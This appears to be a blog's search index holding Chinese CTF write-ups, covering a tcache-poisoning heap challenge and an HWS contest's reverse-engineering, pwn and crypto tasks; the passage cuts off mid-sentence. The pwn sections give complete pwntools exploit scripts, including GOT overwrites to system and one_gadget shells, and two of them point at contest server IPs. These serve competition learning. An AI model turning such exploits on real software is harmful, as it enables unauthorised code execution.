<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2023第七届蓝帽杯初赛Pwn-takeway-wp</title>
    <url>/2023/08/26/2023%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BPwn-takeway-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
学艺不精...对于"读/写函数对指针的利用"没那么敏感（
</blockquote>
<span id="more"></span>
<h1 id="xff-说在前面">0xff 说在前面</h1>
<p>下文EXP中，leak堆地址的部分需要"伪爆破"，如果报错的话多运行两三次脚本，直到heap_addr为四字节时即可成功运行
<a href="https://cowtransfer.com/s/bf2ac55a69364d">题目地址</a>下载口令:
7c9pe6</p>
<h1 id="x00-exploitations">0x00 Exploitations</h1>
<ol type="1">
<li>tcachebin libc2.31
<ol type="1">
<li>tcachebin poisoning</li>
<li>版本判断
<ol type="1">
<li>tcache有key混淆，则是2.31以上(不包含2.31)</li>
<li>tcache有doublefree检测，则是2.28以上</li>
<li>有tcache，则是2.26以上</li>
</ol></li>
</ol></li>
<li>UAF</li>
<li>利用题目提供的堆表+puts/read进行任意地址读写</li>
</ol>
<h1 id="x01-反汇编修改">0x01 反汇编修改</h1>
<pre><code>    首先进行一个反汇编的读   </code></pre>
<blockquote>
<p>trick: IDA中对变量按Y键可以改变变量类型</p>
</blockquote>
<p><img src="/pic/Pasted%20image%2020230826230935.png" /> alloc:
strcspn是从字符串中返回不含“所查找字符”的子字符串的长度 <img
src="/pic/Pasted%20image%2020230826231015.png" /> delete:
指针未置零，一眼UAF <img
src="/pic/Pasted%20image%2020230826231112.png" /> modify <img
src="/pic/Pasted%20image%2020230826231127.png" /></p>
<h1 id="x02-分析与思路构造">0x02 分析与思路构造</h1>
<blockquote>
<p>分析部分</p>
</blockquote>
<ol type="1">
<li>分析alloc: 只给了五次创建堆的机会，堆的大小都固定为0x28
<ol type="1">
<li>没办法直接用unsortedbin leak libc</li>
<li>不能通过填满tcachebin来绕过tcache机制</li>
<li>tcachebins poisoning
<ol type="1">
<li>能拿到堆地址: 通过gdb找偏移来在堆区伪造chunk</li>
<li>能拿到栈地址: 通过gdb找偏移来在栈区伪造chunk</li>
</ol></li>
</ol></li>
<li>分析modify: 有puts/read
<ol type="1">
<li>可能通过puts"直到遇到换行符才停止输出"的原理来泄露什么东西</li>
</ol></li>
<li>分析delete
<ol type="1">
<li>UAF</li>
</ol></li>
<li>远程测试libc版本
<ol type="1">
<li>doubleFree有限制，2.28以上</li>
<li>没有key混淆bk，可以直接拿到堆地址，2.31及以下</li>
</ol></li>
</ol>
<blockquote>
<p>思路构造部分</p>
</blockquote>
<p>最开始没patchelf，只能free两个chunk到tcachebin里，通过泄露fd的方式来泄露堆地址，然后我想tcachebin
poisoning把堆中大小为0x1011的缓冲区下面的那一部分给修改一下，改成unsortedbin然后获取libc，再poison到got表修改free，最后提权。但这样消耗的chunk数目远大于5个。<br />
后来patch以后发现bk里就有堆地址，然后又想到临近top chunk的unsorted
bin会被合并。于是把目标对准了heapList。想通过修改heapList的size段位0x1041来伪造一个unsortedbin，然后leak
libc。结果也是需要大量chunk，而且还申请失败了，现在没搞明白为啥失败了不说，连报错都忘了，无从下手了（
打完比赛以后跟N1nEmAn师傅沟流了一下，发现题目如果能在heapList伪造chunk的话，就可以通过modify函数里的puts和read任意地址读写了。我直接震撼HeyGap一百年。</p>
<p>综上，思路为：<br />
1. 利用tcachebin的bk泄露堆地址 2.
在heapList伪造chunk，修改chunk0_ptr为"puts_got-8" 3.
puts会打印puts_got指向的地址，即puts_libc_addr，然后计算system地址 4.
通过gdb发现"puts_got-8"正好是"free_got" 5.
而read函数正好是修改"puts_got-8"指向的地址，即free_libc_addr，我们将其修改为sys_libc_addr
6. 由于chunk0_ptr,
chunk1_ptr均被修改，所以我们要找"ptr没有被修改"&amp;"chunk没有被free过"的chunk2存一下/bin/sh
7. free chunk2 --&gt; getshell！ # 0x03 分步解题 1.
patchelf，根据远程调试选择了libc2.31 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-rpath &#x27;$ORIGIN/&#x27; file_name</span><br><span class="line">patchelf --set-interpreter my-ld-linux.so.2 my-program</span><br><span class="line">patchelf --replace-needed liboriginal.so.1 libreplacement.so.1 my-program</span><br></pre></td></tr></table></figure></p>
<ol start="2" type="1">
<li>利用tcachebin的bk泄露堆地址 可以看到bk是指向tcachebin_entries[3]的
<img src="/pic/Pasted%20image%2020230827001916.png" />
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1 = payload2 = &#x27;\x00&#x27;</span><br><span class="line">alloc(0,payload1,payload2)</span><br><span class="line">alloc(1,payload1,payload2)     # 这里申请了chunk1其实对这一步没啥用，下一步申请也行</span><br><span class="line">delete(0)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">heap_addr = u64(io.recvuntil(&#x27;\n&#x27;)[-5:-1].ljust(8,b&#x27;\x00&#x27;)) # 注：这里我没想到更好的方法，heap_addr有可能是三字节</span><br><span class="line">															  也有可能是四字节，所以后续如果报错多试几次就行。</span><br><span class="line">print(&#x27;heap_addr   ---&gt;   &#x27;,hex(heap_addr))</span><br><span class="line">payload = p64(0)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload)</span><br></pre></td></tr></table></figure></li>
<li>通过tcache poisoning在heapList段伪造chunk2， <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete(1)                        # 把上一步申请的chunk1放进tcachebin</span><br><span class="line"># gdb.attach(io)                 # 通过bins命令可以看到现在是tcachebin_entries[3] -&gt; chunk1 -&gt; chunk0</span><br><span class="line">payload = p64(heap_addr + 0x290) # 改为tcachebin_entries[3] -&gt; chunk1 -&gt; (heap_addr + 0x290)</span><br><span class="line">fill(1,payload)                  </span><br><span class="line">alloc(2,payload1,payload2)       # 把chunk1申请出来，bins变为tcachebin_entries[3] -&gt; (heap_addr + 0x290)</span><br></pre></td></tr></table></figure></li>
<li>申请chunk2，同时把puts_got-8写进heapList[0]，然后通过modify函数中的puts泄露libc（笔误:
下图“加上下一个chunk的prev_size构成了chunk2”中的"chunk2"应为chunk3）
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload1 = p64(puts_got-8)</span><br><span class="line">alloc(3,payload1,payload2)</span><br><span class="line">fill(3,payload1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">io.recvuntil(&#x27;this order is: &#x27;)</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br></pre></td></tr></table></figure> <img src="/pic/Pasted%20image%2020230827003153.png" />
读者也可以通过<code>x/20gx 0x404020</code>来查看Libc中free的下一个地址是不是puts<br />
</li>
<li>修改"puts_got-8"指向的地址，即free_libc_addr，我们将其修改为sys_libc_addr
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload1)</span><br></pre></td></tr></table></figure></li>
<li>找"ptr没有被修改"&amp;"chunk没有被free过"的chunk2存一下/bin/sh然后free掉他，getshell！
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;/bin/sh\x00&#x27;</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">fill(2,payload)</span><br><span class="line">delete(2)</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="x04-完整exp">0x04 完整EXP</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;101.200.234.115&#x27;</span><br><span class="line">port = 42490</span><br><span class="line">file = &#x27;./takeway&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./takeway&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(index,name,remark):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;index&#x27;, str(index))</span><br><span class="line">  io.sendafter(&#x27;name: &#x27;, name)</span><br><span class="line">  io.sendafter(&#x27;remark: &#x27;, remark)</span><br><span class="line">  </span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line"></span><br><span class="line">def fill(index,name):</span><br><span class="line">  io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line">  io.sendafter(&#x27;name is: &#x27;, name)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payload1 = &#x27;\x00&#x27;</span><br><span class="line">payload2 = &#x27;\x00&#x27;</span><br><span class="line">alloc(0,payload1,payload2)</span><br><span class="line">alloc(1,payload1,payload2)</span><br><span class="line">delete(0)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">heap_addr = u64(io.recvuntil(&#x27;\n&#x27;)[-5:-1].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;heap_addr   ---&gt;   &#x27;,hex(heap_addr))</span><br><span class="line">payload = p64(0)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">delete(1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload = p64(heap_addr + 0x290)</span><br><span class="line">fill(1,payload)</span><br><span class="line">alloc(2,payload1,payload2)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload1 = p64(puts_got-8)</span><br><span class="line">alloc(3,payload1,payload2)</span><br><span class="line">fill(3,payload1)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;choose: &#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;index: &#x27;, str(0))</span><br><span class="line">io.recvuntil(&#x27;this order is: &#x27;)</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;name is: &#x27;, payload1)</span><br><span class="line">payload = &#x27;/bin/sh\x00&#x27;</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">fill(2,payload)</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="x05-总结">0x05 总结</h1>
<p>这题太遗憾了...最后也没做出来。不过做一窍不通的题收获才最大。<br />
做这道题之前还从来没接触过2.26版本以上的堆题，所以对tcachebin完全不了解。<br />
对tcachebin的第一印象如下:<br />
1. 概述<br />
1. 0x10~0x410（貌似是）的chunk 2. LIFO 3.
大小只有7，free满以后再free就会放到对应的其他bin中 4.
2.28及以下的libc不检测double free 2. 伪造chunk 1.
安全性比fastbin还差，不检验fd指向chunk的size直接申请 3. leak堆地址 1.
2.31及以下libc没有key加密，可以直接leak出对应大小的tcachebin_entry
目前就想到这些，这次多亏队友带飞，进半决赛了XD</p>
]]></content>
      <categories>
        <category>CTF_practice</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>2023HwsSDU专场CTF-wp</title>
    <url>/2023/11/19/2023HwsSDU%E4%B8%93%E5%9C%BACTF-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
HWS！PWN+RE+CRYPTO
</blockquote>
<span id="more"></span>
<h1 id="re">RE</h1>
<h2 id="re-1">Re</h2>
<blockquote>
<p>这个题本来打好逆向后的包准备写 wp
的，结果重新加载的时候给覆盖了...就不配图了，函数顺序按照反汇编从上到下来分析的。</p>
</blockquote>
<p>拿到这个题看到有反调试，没 patch ，直接静态分析了</p>
<h4 id="st-important-function">- 1st important function</h4>
<p>第一个重要函数里有一个 flag{} 的判断，还有一个对于'-'的判断，可以猜测
flag 的格式为 flag{uuid}</p>
<p>接下来的一个函数有花指令，把 E8 改成 90
以后重新反汇编，还是没有啥东西...为了不影响后面做题，还是回到一开始的地方把
jz 改成了 jnz
，然后动调发现这个带花的函数基本没啥用，好像就调用了个<code>__chkesp</code>函数，但我不太清楚这是干啥的，就直接忽略了</p>
<h4 id="nd-important-function">- 2nd important function</h4>
<p>第二个重要函数对我们输入的 flag
做了一些操作，把中间的'-'全部删掉，并做了一些移动的操作，大概就是
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa&#125;</span><br><span class="line">flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="rd-important-function">- 3rd important function</h4>
<p>第三个函数将 uuid 的前 32
个字节作为参数，做了一些异或操作和比对操作，我们可以恢复一部分 flag
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int encdata1[13];</span><br><span class="line">char encdata2[16];</span><br><span class="line">int encdata3[22];</span><br><span class="line">char flag[42]=&quot;flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaxxxx&#125;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void func1()</span><br><span class="line">&#123;</span><br><span class="line">    encdata1[0] = 102;</span><br><span class="line">    encdata1[1] = 52;</span><br><span class="line">    encdata1[2] = 51;</span><br><span class="line">    encdata1[3] = 49;</span><br><span class="line">    encdata1[4] = 52;</span><br><span class="line">    encdata1[5] = 57;</span><br><span class="line">    encdata1[6] = 96;</span><br><span class="line">    encdata1[7] = 60;</span><br><span class="line">    encdata1[8] = 61;</span><br><span class="line">    encdata1[9] = 34;</span><br><span class="line">    encdata1[10] = 104;</span><br><span class="line">    encdata1[11] = 33;</span><br><span class="line">    encdata1[12] = 56;</span><br><span class="line">    int count = 5;</span><br><span class="line">    for (int i = 0; i &lt; 13; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        if ( i % 2 )</span><br><span class="line">        &#123;</span><br><span class="line">            flag[count] = encdata1[i] ^ (2*i);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            flag[count] = encdata1[i] ^ i;</span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func1();</span><br><span class="line">    cout&lt;&lt;flag&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># flag&#123;f61703f2-50b7-4aaa-aaaa-aaaaaaaaaaaa&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到，这个函数只对前13个字节做了操作，剩下的19个字节没用到</p>
<h4 id="th-important-function">- 4th important function</h4>
<p>第四个函数将 uuid
的中间18位放了进去，然后做了一大堆操作以后跟下面的东西做了比较</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v5[0] = 63;</span><br><span class="line">v5[1] = -70;</span><br><span class="line">v5[2] = -60;</span><br><span class="line">v5[3] = -111;</span><br><span class="line">v5[4] = -60;</span><br><span class="line">v5[5] = 116;</span><br><span class="line">v5[6] = 2;</span><br><span class="line">v5[7] = 38;</span><br><span class="line">v5[8] = -20;</span><br><span class="line">v5[9] = -110;</span><br><span class="line">v5[10] = 56;</span><br><span class="line">v5[11] = -62;</span><br><span class="line">v5[12] = 11;</span><br><span class="line">v5[13] = 109;</span><br><span class="line">v5[14] = 39;</span><br><span class="line">v5[15] = -45;</span><br></pre></td></tr></table></figure>
<p>由于看到了这个函数里面有个子函数有超长的一串，虽然看不懂，但我怀疑这应该是某个加密算法的手搓版，于是就问
GPT 老师，它跟我说是MD5加密算法的一部分(后来用 findcrypt
插件也能看出来)。</p>
<p>而后面还有个函数是这18位中前14位的 base64_encode
，也就是说我们解码后只需要爆破后4位即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def generate_md5(text):</span><br><span class="line">    return hashlib.md5(text.encode(&#x27;utf-8&#x27;)).digest()</span><br><span class="line"></span><br><span class="line">target_hash = ([63, -70, -60, -111, -60, 116, 2, 38, -20, -110, 56, -62, 11, 109, 39, -45])</span><br><span class="line"></span><br><span class="line">for i in range(16):</span><br><span class="line">    for j in range(16):</span><br><span class="line">        for k in range(16):</span><br><span class="line">            for m in range(16):</span><br><span class="line">        # 将i和j转换为两位16进制数</span><br><span class="line">                hex_i = format(i, &#x27;01x&#x27;)</span><br><span class="line">                hex_j = format(j, &#x27;01x&#x27;)</span><br><span class="line">                hex_k = format(k, &#x27;01x&#x27;)</span><br><span class="line">                hex_m = format(m, &#x27;01x&#x27;)</span><br><span class="line">        </span><br><span class="line">        # 构建待加密的明文</span><br><span class="line">                plaintext = f&#x27;f47813c26594c0&#123;hex_i&#125;&#123;hex_j&#125;&#123;hex_k&#125;&#123;hex_m&#125;&#x27;</span><br><span class="line">                # print(plaintext)</span><br><span class="line">                </span><br><span class="line">                # 计算MD5散列值</span><br><span class="line">                hashed_text = generate_md5(plaintext)</span><br><span class="line">                # print(hashed_text.hex())</span><br><span class="line"></span><br><span class="line">                if hashed_text.hex() == &#x27;3fbac491c4740226ec9238c20b6d27d3&#x27;:</span><br><span class="line">                    print(plaintext)</span><br><span class="line"></span><br><span class="line"># flag&#123;f61703f2-50b7-4f47-813c-26594c0e581a&#125; // 这里的最后一位 a 不是真的 a ，是因为一开始我写的 flag 格式是a，这一位还是需要我们爆破的</span><br></pre></td></tr></table></figure>
<p>拿到平台上去爆破最后一位，没想到直接就是 0 ，一遍过~</p>
<blockquote>
<p>flag{f61703f2-50b7-4f47-813c-26594c0e5810}</p>
</blockquote>
<h1 id="pwn">PWN</h1>
<h2 id="inverse">inverse</h2>
<p>32位 + 整数溢出 + 简单栈溢出，思路真没啥好写的，直接上exp吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;124.71.135.126:30011&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./pwn&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">io.send(&#x27;/bin/sh&#x27;)</span><br><span class="line">io.sendline(&#x27;-1&#x27;)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">work_addr = 0x80493D5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload = b&#x27;a&#x27;*0x40 + p32(puts_plt) + p32(work_addr) + p32(read_got)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&#x27; msg:&#x27;)</span><br><span class="line">read_addr = u32(io.recv(4))</span><br><span class="line">print(&#x27;read_addr  ---&gt;  &#x27;,hex(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base = read_addr - libc.sym[&#x27;read&#x27;]</span><br><span class="line">sys_addr = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh  =  libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">bin_sh = 0x0804C030</span><br><span class="line">print(&#x27;libc_base  ---&gt;  &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr  ---&gt;  &#x27;,hex(sys_addr))</span><br><span class="line">print(&#x27;bin_sh  ---&gt;  &#x27;,hex(bin_sh))</span><br><span class="line"></span><br><span class="line">io.sendline(&#x27;-1&#x27;)</span><br><span class="line">payload = b&#x27;a&#x27;*0x40 + p32(sys_addr) + p32(work_addr) + p32(bin_sh)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="controller">controller</h2>
<p>这题是 awdp/awd 的题吧，好多洞...但是为什么 patchelf
以后会给我报<code>libgcc_s.so.0</code>的错啊，我还从
lib64/lib/2.27libgcc库 中拷贝了对应文件，结果都不行...</p>
<p>灰盒的 heap 题太难打了...不过从22:00打到3:00出 flag
的一瞬间真的巨爽</p>
<p>这题逆向就挺费时间的，一堆没啥用的函数，就只有<code>choice == 1/2/3/6(堆题的uaf) || choice == 1/9(fmt + 栈)</code></p>
<p>...写 wp 的时候去看了一下 choice == 9，结果突然发现 strlen 用''
就可以随便绕...早知道不灰盒打堆了...</p>
<p>我的思路是 uaf + fastbin attack</p>
<ul>
<li>alloc 再 free 两个 chunk<br />
</li>
<li>由于 fastbin LIFO，利用 uaf 将 heap_list (堆指针表)的地址写入
chunk13 的 fd 和 bk</li>
<li>申请两个同样大小的 chunk ，我们就能用 chunk15 任意地址读写了</li>
<li>leak
<ul>
<li>首先把 malloc 的 got 写进 chunk15，然后 show，就可以leak libc
基址</li>
</ul></li>
<li>write
<ul>
<li>由于这个时候，heap_list 中还存有 malloc_got
，于是我们直接控制这个指针去写 malloc_got 指向的地址</li>
</ul></li>
<li>将 one_gadget 写入 malloc_got 指向的地址，当我们再去 malloc
的时候，就会调用 og 进而提权。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;124.71.135.126:30070&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./pwn&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size,content1,content2):</span><br><span class="line">  io.sendlineafter(&#x27;&gt; &#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;length of the new pipe name? &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;name of the new pipe? &#x27;, content1)</span><br><span class="line">  io.sendlineafter(&#x27;Please write a description: &#x27;, content2)</span><br><span class="line">  io.sendlineafter(&#x27;(radius,speed,length): &#x27;,&#x27;1&#x27;)</span><br><span class="line">  </span><br><span class="line">def free(index):</span><br><span class="line">  io.sendlineafter(&#x27;&gt; &#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Please choose pipe: &#x27;, str(index))</span><br><span class="line">  io.sendline()</span><br><span class="line">  </span><br><span class="line">def edit(index,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt; &#x27;, str(6))</span><br><span class="line">  io.sendlineafter(&#x27;Choose &gt;&#x27;,str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Please choose pipe: &#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Plese input info &gt;&#x27;,content)</span><br><span class="line">  io.sendline()</span><br><span class="line"></span><br><span class="line"># def show(index):</span><br><span class="line">#   io.sendlineafter(&#x27;&gt; &#x27;, str(1))</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">content1 = &#x27;a&#x27;*8</span><br><span class="line">content2 = &#x27;b&#x27;*80</span><br><span class="line"></span><br><span class="line">alloc(0x30,content1,content2) # 12</span><br><span class="line">alloc(0x30,content1,content2) # 13</span><br><span class="line">free(12)</span><br><span class="line">free(13)</span><br><span class="line">content = p64(0x60418f)</span><br><span class="line">edit(13,content)</span><br><span class="line">alloc(0x30,content1,content1) # 14</span><br><span class="line"></span><br><span class="line">malloc_got = elf.got[&#x27;malloc&#x27;]</span><br><span class="line">content1 = b&#x27;\x00\x00\x00\x01\x00\x00\x02\x40\x00&#x27; + p64(malloc_got) + p64(malloc_got)</span><br><span class="line">alloc(0x30,content1,content1) # 15</span><br><span class="line">io.sendlineafter(&#x27;&gt; &#x27;, str(1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># io.sendlineafter(&#x27;&gt; &#x27;, str(11))</span><br><span class="line"># io.sendlineafter(&#x27;&gt; &#x27;, str(1))</span><br><span class="line">malloc_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(malloc_addr))</span><br><span class="line">libc_base = malloc_addr - libc.sym[&#x27;malloc&#x27;]</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">og = [0x4f2a5,0x4f302,0x10a2fc]</span><br><span class="line">get_shell = libc_base + og[2]</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(get_shell))</span><br><span class="line">content = p64(get_shell)</span><br><span class="line">io.sendline()</span><br><span class="line">edit(2,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>为了写这题我还特意写了个 exp_local.py 来测试本地高版本libc的堆..</p>
</blockquote>
<h1 id="crypto">Crypto</h1>
<blockquote>
<p>没想到 ak 的居然是密码，这俩都是板子题</p>
</blockquote>
<h2 id="ezrsa">ezRSA</h2>
<p>这题两个数的位置反了😭卡了好长时间来着，我说为什么 getPrime 生成的 p
怎么会不是素数</p>
<p>这题一眼求解二次剩余，公钥课上学过(没想到课堂上的东西能拿来打CTF)，从网上扒一个脚本直接解
